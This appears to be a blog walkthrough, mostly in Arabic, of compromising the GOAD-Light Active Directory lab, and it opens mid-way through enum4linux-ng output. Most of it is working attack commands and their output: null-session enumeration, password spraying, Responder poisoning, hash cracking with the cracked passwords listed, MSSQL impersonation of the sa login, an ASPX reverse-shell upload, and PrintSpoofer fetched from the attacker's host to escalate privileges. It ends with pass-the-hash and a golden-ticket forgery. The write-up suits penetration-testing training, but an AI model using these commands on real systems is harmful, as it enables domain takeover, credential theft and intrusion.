- SEVENKINGDOMS   <1c> - <GROUP> M <ACTIVE>  Domain Controllers                  
- SEVENKINGDOMS   <1b> -         M <ACTIVE>  Domain Master Browser               
- KINGSLANDING    <20> -         M <ACTIVE>  File Server Service                 
- MAC Address = 00-0C-29-6A-E7-D9                                                
 =============================================================
|    SMB Dialect Check on kingslanding.sevenkingdoms.local    |
 =============================================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                              
SMB 1.0: false                                                                 
SMB 2.0.2: true                                                                
SMB 2.1: true                                                                  
SMB 3.0: true                                                                  
SMB 3.1.1: true                                                                
Preferred dialect: SMB 3.0                                                       
SMB1 only: false                                                                 
SMB signing required: true                                                       
 ===============================================================================
|    Domain Information via SMB session for kingslanding.sevenkingdoms.local    |
 ===============================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: KINGSLANDING                                              
NetBIOS domain name: SEVENKINGDOMS                                               
DNS domain: sevenkingdoms.local                                                  
FQDN: kingslanding.sevenkingdoms.local                                           
Derived membership: domain member                                                
Derived domain: SEVENKINGDOMS                                                    
 =============================================================
|    RPC Session Check on kingslanding.sevenkingdoms.local    |
 =============================================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
 =======================================================================
|    Domain Information via RPC for kingslanding.sevenkingdoms.local    |
 =======================================================================
[+] Domain: SEVENKINGDOMS
[+] Domain SID: S-1-5-21-604280439-1264172327-689438309
[+] Membership: domain member
 ===================================================================
|    OS Information via RPC for kingslanding.sevenkingdoms.local    |
 ===================================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                         
OS version: '10.0'                                                               
OS release: '1809'                                                               
OS build: '17763'                                                                
Native OS: not supported                                                         
Native LAN manager: not supported                                                
Platform id: null                                                                
Server type: null                                                                
Server type string: null                                                         
 =========================================================
|    Users via RPC on kingslanding.sevenkingdoms.local    |
 =========================================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
 ==========================================================
|    Groups via RPC on kingslanding.sevenkingdoms.local    |
 ==========================================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED
 ==========================================================
|    Shares via RPC on kingslanding.sevenkingdoms.local    |
 ==========================================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user
 =============================================================
|    Policies via RPC for kingslanding.sevenkingdoms.local    |
 =============================================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed
 =============================================================
|    Printers via RPC for kingslanding.sevenkingdoms.local    |
 =============================================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

# 192.168.56.10 enum
$ enum4linux-ng -A 192.168.56.10

ENUM4LINUX - next generation (v1.3.10)
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.56.10
[*] Username ......... ''
[*] Random Username .. 'ygdrxwla'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)
 ======================================
|    Listener Scan on 192.168.56.10    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
 =====================================================
|    Domain Information via LDAP for 192.168.56.10    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: sevenkingdoms.local
 ============================================================
|    NetBIOS Names and Workgroup/Domain for 192.168.56.10    |
 ============================================================
[+] Got domain/workgroup name: SEVENKINGDOMS
[+] Full NetBIOS names information:
- SEVENKINGDOMS   <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name
- SEVENKINGDOMS   <1c> - <GROUP> M <ACTIVE>  Domain Controllers
- KINGSLANDING    <00> -         M <ACTIVE>  Workstation Service
- KINGSLANDING    <20> -         M <ACTIVE>  File Server Service
- SEVENKINGDOMS   <1b> -         M <ACTIVE>  Domain Master Browser
- MAC Address = 00-0C-29-C8-3C-FD
 ==========================================
|    SMB Dialect Check on 192.168.56.10    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                              
SMB 1.0: false                                                                 
SMB 2.0.2: true                                                                
SMB 2.1: true                                                                  
SMB 3.0: true                                                                  
SMB 3.1.1: true                                                                
Preferred dialect: SMB 3.0                                                       
SMB1 only: false                                                                 
SMB signing required: true                                                       
 ============================================================
|    Domain Information via SMB session for 192.168.56.10    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: KINGSLANDING                                              
NetBIOS domain name: SEVENKINGDOMS                                               
DNS domain: sevenkingdoms.local                                                  
FQDN: kingslanding.sevenkingdoms.local                                           
Derived membership: domain member                                                
Derived domain: SEVENKINGDOMS                                                    
 ==========================================
|    RPC Session Check on 192.168.56.10    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
 ====================================================
|    Domain Information via RPC for 192.168.56.10    |
 ====================================================
[+] Domain: SEVENKINGDOMS
[+] Domain SID: S-1-5-21-604280439-1264172327-689438309
[+] Membership: domain member
 ================================================
|    OS Information via RPC for 192.168.56.10    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                         
OS version: '10.0'                                                               
OS release: '1809'                                                               
OS build: '17763'                                                                
Native OS: not supported                                                         
Native LAN manager: not supported                                                
Platform id: null                                                                
Server type: null                                                                
Server type string: null                                                         
 ======================================
|    Users via RPC on 192.168.56.10    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED
 =======================================
|    Groups via RPC on 192.168.56.10    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED
 =======================================
|    Shares via RPC on 192.168.56.10    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user
 ==========================================
|    Policies via RPC for 192.168.56.10    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed
 ==========================================
|    Printers via RPC for 192.168.56.10    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

# 192.168.56.11 enum (Most important)
$ enum4linux-ng -A 192.168.56.11
ENUM4LINUX - next generation (v1.3.10)
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.56.11
[*] Username ......... ''
[*] Random Username .. 'agnnarel'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)
 ======================================
|    Listener Scan on 192.168.56.11    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
 =====================================================
|    Domain Information via LDAP for 192.168.56.11    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: sevenkingdoms.local
 ============================================================
|    NetBIOS Names and Workgroup/Domain for 192.168.56.11    |
 ============================================================
[+] Got domain/workgroup name: NORTH
[+] Full NetBIOS names information:
- WINTERFELL      <00> -         M <ACTIVE>  Workstation Service                 
- NORTH           <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name               
- NORTH           <1c> - <GROUP> M <ACTIVE>  Domain Controllers                  
- WINTERFELL      <20> -         M <ACTIVE>  File Server Service                 
- NORTH           <1b> -         M <ACTIVE>  Domain Master Browser               
- MAC Address = 00-0C-29-7E-4F-33                                                
 ==========================================
|    SMB Dialect Check on 192.168.56.11    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                              
SMB 1.0: false                                                                 
SMB 2.0.2: true                                                                  SMB 2.1: true                                                                   SMB 3.0: true                                                                  
SMB 3.1.1: true                                                                
Preferred dialect: SMB 3.0                                                       
SMB1 only: false                                                                 
SMB signing required: true                                                       
 ============================================================
|    Domain Information via SMB session for 192.168.56.11    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: WINTERFELL                                                
NetBIOS domain name: NORTH                                                       
DNS domain: north.sevenkingdoms.local                                            
FQDN: winterfell.north.sevenkingdoms.local                                       
Derived membership: domain member                                                
Derived domain: NORTH                                                            
 ==========================================
|    RPC Session Check on 192.168.56.11    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE
 ====================================================
|    Domain Information via RPC for 192.168.56.11    |
 ====================================================
[+] Domain: NORTH
[+] Domain SID: S-1-5-21-508423329-115901089-1858097058
[+] Membership: domain member
 ================================================
|    OS Information via RPC for 192.168.56.11    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                         
OS version: '10.0'                                                               
OS release: '1809'                                                               
OS build: '17763'                                                                
Native OS: not supported                                                         
Native LAN manager: not supported                                                
Platform id: null                                                                
Server type: null                                                                
Server type string: null                                                         
 ======================================
|    Users via RPC on 192.168.56.11    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 10 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 10 user(s) via 'enumdomusers'
[+] After merging user results we have 10 user(s) total:
'1110':                                                                          
  username: arya.stark                                                           
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: Arya Stark                                                        
'1114':                                                                          
  username: sansa.stark                                                          
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: Sansa Stark                                                       
'1115':                                                                          
  username: brandon.stark                                                        
  name: (null)                                                                   
  acb: '0x00010210'                                                              
  description: Brandon Stark                                                     
'1116':                                                                          
  username: rickon.stark                                                         
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: Rickon Stark                                                      
'1117':                                                                          
  username: hodor                                                                
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: Brainless Giant                                                   
'1118':                                                                          
  username: jon.snow                                                             
  name: (null)                                                                   
  acb: '0x00040210'                                                              
  description: Jon Snow                                                          
'1119':                                                                          
  username: samwell.tarly                                                        
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: 'Samwell Tarly (Password : Heartsbane)' #Nice !                   
'1120':                                                                          
  username: jeor.mormont                                                         
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: Jeor Mormont                                                      
'1121':                                                                          
  username: sql_svc                                                              
  name: (null)                                                                   
  acb: '0x00000210'                                                              
  description: sql service                                                       
'501':                                                                           
  username: Guest                                                                
  name: (null)                                                                   
  acb: '0x00000215'                                                              
  description: Built-in account for guest access to the computer/domain          
 =======================================
|    Groups via RPC on 192.168.56.11    |
 =======================================
[*] Enumerating local groups
[+] Found 6 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 21 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 11 group(s) via 'enumdomgroups'
[+] After merging groups results we have 38 group(s) total:
'1102':                                                                          
  groupname: DnsAdmins                                                           
  type: local                                                                    
'1103':                                                                          
  groupname: DnsUpdateProxy                                                      
  type: domain                                                                   
'1106':                                                                          
  groupname: Stark                                                               
  type: domain                                                                   
'1107':                                                                          
  groupname: Night Watch                                                         
  type: domain                                                                   
'1108':                                                                          
  groupname: Mormont                                                             
  type: domain                                                                   
'1109':                                                                          
  groupname: AcrossTheSea                                                        
  type: local                                                                    
'513':                                                                           
  groupname: Domain Users                                                        
  type: domain                                                                   
'514':                                                                           
  groupname: Domain Guests                                                       
  type: domain                                                                   
'515':                                                                           
  groupname: Domain Computers                                                    
  type: domain                                                                   
'517':                                                                           
  groupname: Cert Publishers                                                     
  type: local                                                                    
'520':                                                                           
  groupname: Group Policy Creator Owners                                         
  type: domain                                                                   
'522':                                                                           
  groupname: Cloneable Domain Controllers                                        
  type: domain                                                                   
'525':                                                                           
  groupname: Protected Users                                                     
  type: domain                                                                   
'526':                                                                           
  groupname: Key Admins                                                          
  type: domain                                                                   
'545':                                                                           
  groupname: Users                                                               
  type: builtin                                                                  
'546':                                                                           
  groupname: Guests                                                              
  type: builtin                                                                  
'553':                                                                           
  groupname: RAS and IAS Servers                                                 
  type: local                                                                    
'554':                                                                           
  groupname: Pre-Windows 2000 Compatible Access                                  
  type: builtin                                                                  
'555':                                                                           
  groupname: Remote Desktop Users                                                
  type: builtin                                                                  
'556':                                                                           
  groupname: Network Configuration Operators                                     
  type: builtin                                                                  
'558':                                                                           
  groupname: Performance Monitor Users                                           
  type: builtin                                                                  
'559':                                                                           
  groupname: Performance Log Users                                               
  type: builtin                                                                  
'560':                                                                           
  groupname: Windows Authorization Access Group                                  
  type: builtin                                                                  
'561':                                                                           
  groupname: Terminal Server License Servers                                     
  type: builtin                                                                  
'562':                                                                           
  groupname: Distributed COM Users                                               
  type: builtin                                                                  
'568':                                                                           
  groupname: IIS_IUSRS                                                           
  type: builtin                                                                  
'569':                                                                           
  groupname: Cryptographic Operators                                             
  type: builtin                                                                  
'571':                                                                           
  groupname: Allowed RODC Password Replication Group                             
  type: local                                                                    
'572':                                                                           
  groupname: Denied RODC Password Replication Group                              
  type: local                                                                    
'573':                                                                           
  groupname: Event Log Readers                                                   
  type: builtin                                                                  
'574':                                                                           
  groupname: Certificate Service DCOM Access                                     
  type: builtin                                                                  
'575':                                                                           
  groupname: RDS Remote Access Servers                                           
  type: builtin                                                                  
'576':                                                                           
  groupname: RDS Endpoint Servers                                                
  type: builtin                                                                  
'577':                                                                           
  groupname: RDS Management Servers                                              
  type: builtin                                                                  
'578':                                                                           
  groupname: Hyper-V Administrators                                              
  type: builtin                                                                  
'579':                                                                           
  groupname: Access Control Assistance Operators                                 
  type: builtin                                                                  
'580':                                                                           
  groupname: Remote Management Users                                             
  type: builtin                                                                  
'582':                                                                           
groupname: Storage Replica Administrators                                        
type: builtin                                                                  
 =======================================
|    Shares via RPC on 192.168.56.11    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user
 ==========================================
|    Policies via RPC for 192.168.56.11    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:                                                     
  Password history length: 24                                                    
  Minimum password length: 5                                                     
  Minimum password age: 1 day 4 minutes                                          
  Maximum password age: 37201 days (101 years) 2 minutes                         
  Password properties:                                                           
  - DOMAIN_PASSWORD_COMPLEX: false                                               
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false                                        
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false                                       
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false                                        
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false                              
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false                                
Domain lockout information:                                                      
Lockout observation window: 5 minutes                                          Lockout duration: 5 minutes                                                    
Lockout threshold: 5                                                           
Domain logoff information:                                                       
Force logoff time: not set                                                     
 ==========================================
|    Printers via RPC for 192.168.56.11    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

# 192.168.56.22 enum
$ enum4linux-ng -A 192.168.56.22

ENUM4LINUX - next generation (v1.3.10)
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 192.168.56.22
[*] Username ......... ''
[*] Random Username .. 'rsbfetir'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)
 ======================================
|    Listener Scan on 192.168.56.22    |
 ======================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
 ============================================================
|    NetBIOS Names and Workgroup/Domain for 192.168.56.22    |
 ============================================================
[+] Got domain/workgroup name: NORTH
[+] Full NetBIOS names information:
- CASTELBLACK     <00> -         M <ACTIVE>  Workstation Service                 
- NORTH           <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name               
- CASTELBLACK     <20> -         M <ACTIVE>  File Server Service                 
- MAC Address = 00-0C-29-DC-1C-67                                                
 ==========================================
|    SMB Dialect Check on 192.168.56.22    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                              
  SMB 1.0: false                                                                 
  SMB 2.0.2: true                                                                
  SMB 2.1: true                                                                  
  SMB 3.0: true                                                                  
  SMB 3.1.1: true                                                                
Preferred dialect: SMB 3.0                                                       
SMB1 only: false                                                                 
SMB signing required: false                                                      
 ============================================================
|    Domain Information via SMB session for 192.168.56.22    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: CASTELBLACK                                               
NetBIOS domain name: NORTH                                                       
DNS domain: north.sevenkingdoms.local                                            
FQDN: castelblack.north.sevenkingdoms.local                                      
Derived membership: domain member                                                
Derived domain: NORTH                                                            
 ==========================================
|    RPC Session Check on 192.168.56.22    |
 ==========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_ACCESS_DENIED
[*] Check for guest access
[+] Server allows authentication via username 'rsbfetir' and password ''
[H] Rerunning enumeration with user 'rsbfetir' might give more results
 ================================================
|    OS Information via RPC for 192.168.56.22    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                         
OS version: '10.0'                                                               
OS release: '1809'                                                               
OS build: '17763'                                                                
Native OS: not supported                                                         
Native LAN manager: not supported                                                
Platform id: null                                                                
Server type: null                                                                
Server type string: null 
```

**Key findings**:
- دومينز كامله (FQDNs)
- مسموح الدخول بدون رمز
- اسامي NETBios
- رمز اليوزر *samwell.tarly* 

## Enumeration (Internal)
بعد ماسوينا انيومريشن للايبيز وحصلنا باسورد ليوزر، صار عندنا اكثر من طريقه نجيب فيها معلومات اكثر، الان راح نبدا انيونمريشن من الداخل باستخدام اليوزر اللي حصلناه

``` bash
# تيست للانونيموس لوقن
nxc smb 192.168.56.10 -u '' -p ''
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\: 

# نطلع معلومات الدومينز باليوزر
certipy find -u samwell.tarly -p Heartsbane -dc-ip 192.168.56.10
certipy find -u samwell.tarly -p Heartsbane -dc-ip 192.168.56.11

# اختصار المعلومات اللي حصلناها
# نتائج DC01
 [+] User Enrollable Principals      : SEVENKINGDOMS.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

# نتائج DC02
 [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.

```

الان حصلنا ثغرتين حساسة بالسستم وراح نرجع لها ثاني

عندنا اكسس للدومينز **DC01** & **DC02** لكن فشلنا ندخل السيرفر **SRV02**
![](/Assets/images/GOAD-Light/SRV-Fail.png)

الان نسوي سكان كامل للاكتف دايركتوري من الداخل باستخدام **Bloodhound**.
``` bash
bloodhound-ce-python \                                                           
-u 'samwell.tarly' \
-p 'Heartsbane' \
-d north.sevenkingdoms.local \  
-ns 192.168.56.11 \       
-c All     
```
**النتائج**
![](/Assets/images/GOAD-Light/BloodHoundz.png)

**نرفع الملفات في زيب فايل ل Bloohound**
![](/Assets/images/GOAD-Light/BH-Upload.png)

**ادمينز (North Domain)**
![](/Assets/images/GOAD-Light/Adminz.png)

**اليوزرس**
![](/Assets/images/GOAD-Light/Users.png)

## Pass Spraying
بعد ماحصلنا اليوزرس الثانيه، بنحاول ندخل عليها باسورد سبراي 🔫 

الباسورد سبراي هو طريقة تسجيل دخول على حسابات باستخدام لستة يوزرات نحاول ندخلها باستخدام لستة باسوردات الفرق بين **الباسورد سبراي** **والبروت فورس** هو عدم محاولة اكثر من باسورد على حساب واحد وهذا يساعدنا عشان ماناخذ لوك اوت من الحساب

**ملاحظة**: اذا كان هذا ريد تيمنق واقعي راح تحتاج تجمع معلومات اكثر عن الاشخاص والشركه عبر تسريبات سابقه  او فيشينق عشان تجيب الباسوردات. للباسورد سبري، انصح تبدأ باستخدام باسوردات تطابق اليوزرات لان هذا شائع واقرب زي ماسوينا في هذا المثال
![](/Assets/images/GOAD-Light/Spraying.png)

``` bash
# No bruteforce. User 1 --> Password 1, User 2 --> Password 2.
netexec smb 192.168.56.11 -u Users.txt -p Pass.txt --no-bruteforce --continue-on-success --log SprayRez.txt
```
![](/Assets/images/GOAD-Light/SprayRez.png)
حصلنا يوزر ثاني😮‍💨 . ماكملت لان جربت اكثر من باسورد شائع من وورد لستست ولكن مافي نتيجة

## LLMNR & NBT-NS Poisoning
نعرف من اللاب ان في حسابين بوتات وواحد منهم ادمن بيرسلو كويريز كل ٣ و ٥ دقايق لكن بدون مانعرف هذا تيست بديهي ممكن تسويه داخل اي انفايرونمينت فيها اكتيف داريكتوري عشان تشوف لو تقدر تصيد رمز حساب من الهاش بروتكول اللي بيتستدخم في المنظمة

``` bash
sudo responder -I eth0
```
![](/Assets/images/GOAD-Light/NTLMv1-1.png)

بعد ماصدنا الهاش **NTLMv1**, نستخدم **hashcat** لفك الشفرة.
``` bash
hashcat -m 5500 -a 0 NTLMhashes.hashes /usr/share/wordlists/rockyou.txt.gz
```
![](/Assets/images/GOAD-Light/robb-cracked.png)
حصلنا الباسورد ليوزر وطلع ادمن وبكذا اخذنا النورث دومين !
![](/Assets/images/GOAD-Light/robbpwned.png)

![](/Assets/images/GOAD-Light/HackingDOG.png)

بعد مانسوي دمب، حصلنا كل الكريدينشلز للنورث دومين
![](/Assets/images/GOAD-Light/DUMP.png)

## Exploiting MSSQL
بعد ماحصلنا الهاشز نشوف ايش نقدر نسوي فيها 
``` bash
# نفك شفرة الهاشز اللي حصلناهم
hashcat -m 1000 -a 0 WINTERFELL.ntds /usr/share/wordlists/rockyou.txt.gz
# النتيجة
31d6cfe0d16ae931b73c59d7e0c089c0:Guest:
84bbaa1c58b7f69d2192560a3f932129:brandon.stark:iseedeadpeople
e02bc503339d51f71d913c245d35b50b:vagrant:vagrant
4f622f4cd4284a887228940e2ff4e709:arya.stark:Needle
831486ac7f26860c9e2f51ac91e1a07a:robb.stark:sexywolfy
b8d76e56e9dac90539aff05e3ccb1755:jon.snow:iknownothing
```
بعد ماشيكت، *جون سنو* الادمن للداتابيس، وفي ميسكونفيقريشن في الداتابيس تخليك ادمن بأي يوزر ،الطريقه تحت

![](/Assets/images/GOAD-Light/Imp-sa.png)

![](/Assets/images/GOAD-Light/sa-admin.png)
طريقة انتحال الادمن بأي يوزر
``` powershell
sqlcmd -S ".\SQLEXPRESS" -E -Q "EXECUTE AS LOGIN = 'sa';"
```
Now we have full administrative access on the MSSQL server.

## Exploiting File Upload 
الآن بنسوي اكسبلويت فايل ابلود، ثغرة تعطيك ممكن تجيب منها ريفيرس شيل والسبب ان الفايل ابلود مايسوي فلتر او وايت لست لملفات معينة وبذلك ممكن ترفع أي ملف حتى

خلينا نشيك على الموقع **IIS Website** للآيبي **192.168.56.22**
![](/Assets/images/GOAD-Light/IIS-Web.png)

الموقع مبني على **ASP** وفي فايل ابلود يقبل أي فايل
![](/Assets/images/GOAD-Light/IIS-Web-1.png)

خلينا نشيك على الدايريكتوريز لعل وعسى نحصل شي 
![](/Assets/images/GOAD-Light/DirEnumIIS.png)

في فايل دايريكتوري بس لمن حاول ادخل طلع لي **٤٠٣**. بمعنى ان ذا الدايريكتوري موجود ولكن غير مسموح لنا الدخول

![](/Assets/images/GOAD-Light/upload.png)

خلينا نحاول نجيب **ريفيرس شيل**. جبت البيلود من **[PayLoadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20ASP/shell.aspx)**

بعد مارفعناه هذي النتجية

![](/Assets/images/GOAD-Light/aspxrev.png)

ولكن المشكلة انها مو انتير اكتف بمعنى ان مو كأني على الجهاز والكوماندز تاخذ وقت ولازم اجمعها سوا

لقيت بيلود جميل جدا من **[Darknet](https://www.darknet.org.uk/darknet-archives/#year2014:~:text=InsomniaShell%20%E2%80%93%20ASP.NET%20Reverse%20Shell%20Or%20Bind%20Shell)**

هذا البيلود يخلينا كأننا على الجهاز
![](/Assets/images/GOAD-Light/Interactive-shell.png)

ودخلنا وعندنا **impersonation**.
![](/Assets/images/GOAD-Light/Whoami%20all.png)

ممكن نأبيوز البريفلج ذي ونجيب فيها ادمن**SeImpersonatePrivilege** بإستخدام وحده من البطاطسات 🥔 [**Potato**](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) أو [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer).
``` bash
# Terminal 1: من حهازك كمهاجم
wget -O Pspoofy.exe "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"

# Terminal 2: شغل موقع لوكال ببايثون في نفس الدايركتوري اللي حملت فيه التول
python3 -m http.server 8080

# Terminal 3: من الجهاز اللي عندك عليه ريفيرس شيل
# من داخل باور شيل

mkdir c:\tmp
cd c:\tmp
Invoke-WebRequest -Uri 'http://192.168.56.99:8080/PSpoofy.exe' -OutFile 'C:\tmp\PSpoofy.exe'

# وجرب اذا اشتغلت او لا
whoami
# Execute PrintSpoofer
.\PSpoofy.exe -i -c cmd.exe
```

وبكذا جبت ادمن عالرااايق
![](/Assets/images/GOAD-Light/IIS-Pwned.png)

## Persistence & Lateral Movement (Golden Ticket)
سوينا تيك اوفر للدومين *نورث* وجبنا ادمن على السيرفر *كاستلباك* و *وينترفيل*
الان نبغا نسوي لاتيرال موفمنت عشان نروح للبارنت دومين اللي هو *كينقز لاندنق* شفنا اول ان في ثغرتين ممكن تساعدنا ، لكن اول شي نشوف اذا اي واحد من الآدمنز اللي عندنا برضو ادمن على البارنت
``` bash
nxc smb 192.168.56.10-23 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 --local-auth
```
![](/Assets/images/GOAD-Light/Escalation-Check.png)

زبطت على كاستل باك لكن احنا جربنا لوكال خلينا نجرب على الدومينز الثانيه
``` bash
nxc smb 192.168.56.10-23 -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4
```
![](/Assets/images/GOAD-Light/ESC-Pwning.png)
عندنا ادمن فقط في *النورث* دومين

الآن بنسوي **[Golden Ticket](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/golden-ticket.html)** اتاك بإستخدام *krbtgt* تبع ال *نورث* دومين اللي حصلناه في الدمب أول 
``` bash
# جيب الSID حق النورث دومين
# سوينا انوميموس لوقن وممكن تسجل بيوزر وباسورد وفي اكثر من طريقه تجيب فيها الSID
rpcclient -U "" -N 192.168.56.10

# زور التذكرة الذهبية يواااد
impacket-ticketer -nthash 0f32b298bfa9cd0bcd344f63775b2bd3 -domain-sid S-1-5-21-508423329-115901089-1858097058 -extra-sid S-1-5-21-604280439-1264172327-689438309-519 -domain north.sevenkingdoms.local Administrator

# خلي التذكره الجديده ديفولت
export KRB5CCNAME=/home/kali/AD-GOAD-Light/Creds/Administrator.ccache

# سجل دخول بالتذكره
impacket-psexec north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local -k -no-pass -debug
```

سجل تمام بس حصل مشكلة في الملف اللي المفروض يعطينا شيل
![](/Assets/images/GOAD-Light/Golden-TGTERR.png)
ممكن يكون لأكثر من سبب سواء **حماية ويندوز** أو الملف المريب اللي انحط
خلينا نجرب نسجل دخول ببرتوكول ثانيه زي SMB
``` bash
# SMB Authentication
impacket-smbclient north.sevenkingdoms.local/Administrator@kingslanding.sevenkingdoms.local -k -no-pass 

# Worked, lets enumerate from inside
shares 
ADMIN$
C$
CertEnroll
IPC$
NETLOGON
SYSVOL

# Use one of them
use ADMIN$
ls
```

